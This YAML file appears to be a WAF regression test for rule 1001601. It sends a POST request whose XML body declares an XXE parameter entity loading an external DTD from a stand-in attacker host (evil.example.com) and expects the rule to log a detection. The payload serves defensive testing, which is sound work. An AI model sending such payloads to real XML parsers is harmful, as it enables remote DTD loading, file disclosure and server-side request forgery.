---
meta:
  author: "JiuZhang WAF Team"
  description: XXE parameter entity declaration and reference pair (CUSTOM_PACK)
rule_id: 1001601
tests:
  - test_id: 1
    desc: "Parameter entity declared with SYSTEM and invoked via %dtd; in internal subset"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/xml
          method: POST
          port: 80
          uri: "/post"
          data: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://evil.example.com/x.dtd"> %dtd;]><r/>'
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1001601]
